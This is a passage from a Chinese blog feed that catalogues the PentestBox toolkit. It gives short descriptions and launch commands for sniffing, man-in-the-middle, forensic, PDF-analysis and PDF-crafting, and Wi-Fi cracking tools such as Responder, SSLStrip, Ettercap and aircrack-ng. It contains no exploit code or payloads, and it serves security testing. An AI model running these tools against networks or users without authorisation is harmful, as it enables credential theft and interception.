-</code></pre><p>6.11 嗅探<br><strong>Burp Suite</strong> ——Burp Suite 是一个集成的平台进行安全性测试的web应用程序。它的各种工具无缝地协同工作,以支持整个测试过程,从最初的映射和分析应用程序的攻击表面,通过寻找和利用安全漏洞。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;burpsuite
-</code></pre><p><strong>DNSChe</strong>f——DNSChef是一个高度可配置DNS代理渗透测试人员和恶意软件分析师。DNS代理(又名“假DNS”)是一个工具用于应用程序的网络流量分析等用途。例如,可以使用DNS代理伪造请求“badguy.com”指向一个本地机器终止或拦截,而不是一个真正的主机在互联网上的某个地方。<br>作者:thesprawl<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;dnschef
-</code></pre><p><strong>Ettercap</strong>——Ettercap是一套综合的中间人攻击。它嗅探的实时连接,动态内容过滤和其他许多有趣的把戏。它支持主动和被动解剖的许多协议和包括许多功能网络和主机的分析。<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;ettercap
-</code></pre><p><strong>ngrep</strong>——ngrep pcap-aware工具将允许您指定扩展正则表达式匹配的数据包有效载荷数据。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;ngrep
-</code></pre><p><strong>Network Miner</strong> ——NetworkMiner可以用作被动网络嗅探器/数据包捕获工具，以便检测操作系统，会话，主机名，开放端口等，而不在网络上引入任何流量。 NetworkMiner还可以解析PCAP文件进行离线分析，并从PCAP文件重新生成/重新组合传输的文件和证书。<br>作者:NETRESEC</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;networkminer
-</code></pre><p><strong>Responder</strong>— Responder 是LLMNR，NBT-NS和MDNS中毒程序，内置支持NTLMv1 / NTLMv2 / LMv2，扩展安全性NTLMSSP和基本HTTP身份验证的HTTP / SMB / MSSQL / FTP / LDAP流氓认证服务器。<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;responder
-</code></pre><p><strong>SSlStrip</strong>——它将透明地劫持网络上的HTTP流量，监视HTTPS链接和重定向，然后将这些链接映射到类似于HTTP的链接或同源图类似的HTTPS链接。 它还支持提供图标的模式，看起来像一个锁图标，选择性日志记录和会话拒绝。<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;sslstrip
-</code></pre><p><strong>WinDump</strong>——WinDump tcpdump的Windows版本,UNIX命令行网络分析仪。WinDump完全兼容tcpdump和可以用来观察,诊断并保存到磁盘网络流量根据各种复杂的规则。<br>许可:BSD</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;windump
-</code></pre><p><strong>Wireshark</strong>——Wireshark – Wireshark是世界上最重要的网络协议分析器。 它可以让你看到你的网络在微观层面上发生了什么。 它是许多行业和教育机构的事实上（并通常是法律上的）标准。 Wireshark的发展蓬勃发展得益于全球网络专家的贡献。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;wireshark
-</code></pre><p><strong>Zaproxy</strong>– OWASP Zed攻击代理(攻击)是一个易于使用的综合渗透测试工具在web应用程序中寻找漏洞。是设计用于与广泛的安全经验的人,因此是理想的开发和功能测试人员是渗透测试作为一个有用的补充有经验的笔测试人员工具箱。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;zap
-</code></pre><p>6.12 取证工具<br><strong>Bulk Extractor</strong>——bulk_extractor是一种计算机取证工具，用于扫描磁盘映像，文件或文件目录，并提取有用信息而无需解析文件系统或文件系统结构。 可以使用自动化工具轻松检查，解析或处理结果。 bulk_extractor还创建了它找到的特征的直方图，因为更常见的特征往往更重要。 该程序可用于执法，国防，情报和网络调查应用程序。<br>作者:Simson l·加芬克尔<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;bulkextractor
-</code></pre><p>CapTipper——CapTipper是一个python工具，用于分析，探索和恢复HTTP恶意流量。 CapTipper设置了一个Web服务器，该服务器与PCAP文件中的服务器完全一样，并且包含内部工具，以及一个强大的交互式控制台，用于分析和检查发现的主机，对象和对话。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;captipper
-</code></pre><p><strong>DumpZilla</strong>——Dumpzilla应用程序是在Python 3.x中开发的，目的是提取Firefox，Iceweasel和Seamonkey浏览器的所有取证有趣的信息进行分析。 由于其Python 3.x开发，可能无法在旧的Python版本正常工作，主要是与某些字符。 在Unix和Windows 32/64位系统下工作。 在命令行界面中工作，所以信息转储可以通过管道重定向工具，如grep，awk，cut，sed …<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;dumpzilla
-</code></pre><p><strong>Loki</strong> ——扫描仪的简单指标妥协。检测是基于四个检测方法:<br>国际奥委会文件名称:正则表达式匹配完整的文件路径和名称<br>雅苒规则检查:雅苒签名匹配文件内存和处理数据<br>哈希校验:比较已知的恶意散列(MD5、SHA1,SHA256)和扫描文件</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;loki
-</code></pre><p><strong>Make PDF Tools</strong>——make-pdf-javascript。py允许与嵌入JavaScript创建一个简单的PDF文档打开时将执行的PDF文档。它本质上是mPDF胶水代码。py模块包含一个类方法来创建标题,间接对象,stream objects,stream objects和XREFs。<br>作者:/迪迪埃·史蒂文斯</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;make-pdf-embedded
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;make-pdf-javascript
-</code></pre><p><strong>Origami</strong>–Origami是一个用于操作PDF文档的Ruby框架。 它具有PDF兼容的解析器，并允许分析，修改或创建恶意的PDF文件。 虽然它可能用于多种用途，但折纸主要用作安全工具。 因此，它不专注于文档的图形内容，并且不包括PDF渲染器。<br>许可:GPL</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;pdfsh
-</code></pre><p><strong>pedump</strong>-一个纯ruby实现win32 PE二进制文件转储。<br>作者:zed_0xff<br>许可:麻省理工学院</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;pedump
-</code></pre><p><strong>PDF Parser</strong>——这个工具将解析一个PDF文档识别分析文件中使用的基本要素。它不会呈现一个PDF文档。<br>作者:迪迪埃·史蒂文斯</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;pdf-parser
-</code></pre><p><strong>pdfid</strong>——这个工具不是一个PDF解析器,但它将扫描一个文件寻找某些PDF关键词,允许您识别PDF文档包含JavaScript或执行一个动作(例如)当打开。PDFiD还将处理名称混淆。<br>作者:迪迪埃·史蒂文斯</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;pdfid
-</code></pre><p><strong>PeePD</strong>F——peepdf是一个Python工具探索PDF文件为了找出如果文件可以是有害的。这个工具的目的是提供所有必需的组件安全研究员可以在不使用PDF分析需要3或4工具的所有任务。与peepdf可以看到所有可疑的元素,在文档中显示的对象支持最常用的过滤器和编码,可以解析一个文件的不同版本,对象流和加密的文件。<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;peepdf
-</code></pre><p><strong>rekall</strong> —Rekall框架是一个完全开放的工具集合，在GNU通用公共许可证下的Python中实现，用于从易失性内存（RAM）样本中提取数字工件。 提取技术完全独立于所研究的系统来执行，但是提供了到系统的运行时状态的可见性。<br>作者:谷歌<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;rekall
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;winpmem
-</code></pre><p><strong>Volatility</strong>—–Volatility框架是一个完全开放的工具集合，在GNU通用公共许可证下的Python中实现，用于从易失性内存（RAM）样本中提取数字工件。 提取技术完全独立于所研究的系统来执行，但是提供了到系统的运行时状态的可见性。 该框架旨在向人们介绍与从易失性内存采样中提取数字伪像相关的技术和复杂性，并为这一令人兴奋的研究领域提供进一步工作的平台。<br>作者:稳定的基础<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;volatility
-</code></pre><p>无线攻击</p>
-<p>Aircrack-ng–Aircrack-ng 802.11是一个WEP和WPA-PSK密钥破解程序,可以恢复密钥一旦足够的数据包捕获。它实现了标准FMS攻击以及一些优化KoreK攻击,以及全新的PTW攻击,从而使攻击速度比其他WEP破解工具。<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;airbase-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;aircrack-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;aircrack-ng-GUI
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;airdecap-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;airdecloak-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;aireplay-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;airodump-ng
-
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;airolib-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;airtun-ng
-
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;besside-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;easside-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;ivstools
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;kstats
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;makeivs-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;packetforge-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;tkiptun-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;wesside-ng
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;wpaclean
-</code></pre><p>6.13 文本编辑器</p>
-<p>使PenetestBox更棒,我补充道原子和vim文本编辑器。打开后原子会绝交Atom一边和终端的屏幕另一方面,虽然vim运行在相同的选项卡。原子分裂做是为了使报告更容易给控制台访问和编辑相同的屏幕上。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;atom
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;vim
-</code></pre><p>6.14 Linux实用程序</p>
-<p>PentestBox提供几乎所有Linux实用程序在Windows环境中。下面的列表里面PentestBox Linux实用程序<br>antiword, basename, bash, bison, bzip2, cat, chmod, cmp, connect, cp, curl, cut, date, diff, dirname, du, env, expr, false, find, flex, gawk, git, grep, gunzip, gzip, head, id, kill, mkdir, md5sum, ls, ln , mv, openssl, patch, ps, rebase, rm, rmdir, scp, sh, ssh-keygen, touch, tr, true, uname, uniq, unzip, wc, xargs</p>
-<p>也使PentestBox更棒,我们也包括HTTPie,HTTPie是一个命令行HTTP客户端。它的目标是使CLI与web服务交互尽可能人性化。它提供了一个简单的http命令,允许发送任意http请求使用一个简单的和自然的语法,并显示彩色的输出。HTTPie可以用于测试、调试和一般与HTTP服务器交互。</p>
-<p>6.15 浏览器<br>PentestBox还包含一个修改后的版本Mozilla Firefox所有的安全插件前安装。查看所有以前安装的插件,点击在这里</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;firefox
-</code></pre><p>同时,我们已经包括在内SQLite浏览器在里面。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;sqlitebrowser
-</code></pre><p><a href="http://www.secist.com/archives/2440.html" target="_blank" rel="external">http://www.secist.com/archives/2440.html</a><br><a href="https://tools.pentestbox.org/#linux-utilities" target="_blank" rel="external">https://tools.pentestbox.org/#linux-utilities</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;0x01-Pentest-BOX&quot;&gt;&lt;a href=&quot;#0x01-Pentest-BOX&quot; class=&quot;headerlink&quot; title=&quot;0x01 Pentest BOX&quot;&gt;&lt;/a&gt;0x01 Pentest BOX&lt;/h3&gt;&lt;p&gt;Pentest Box：渗透测试盒子,是一款Windows平台下预配置的便携式开源渗透测试环境，而它也是著名黑客Kapustkiy常用的工具之一。这里集成的大都是Linux下的工具,Kali Linux上面的常用的很多工具这里面也都集成了。&lt;br&gt;它打包了所有的安全工具，并且可以在Windows系统中原生地运行，有效地降低了对虚拟机或者双启动环境的需求。&lt;br&gt;PentestBox官网：&lt;a href=&quot;https://pentestbox.org/zh/&quot;&gt;https://pentestbox.org/zh/&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;0x02-Pentest-BOX特性&quot;&gt;&lt;a href=&quot;#0x02-Pentest-BOX特性&quot; class=&quot;headerlink&quot; title=&quot;0x02 Pentest BOX特性&quot;&gt;&lt;/a&gt;0x02 Pentest BOX特性&lt;/h3&gt;&lt;blockquote&gt;
-&lt;p&gt;易于使用&lt;br&gt;设计简洁
-    
-    </summary>
     
     
       <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
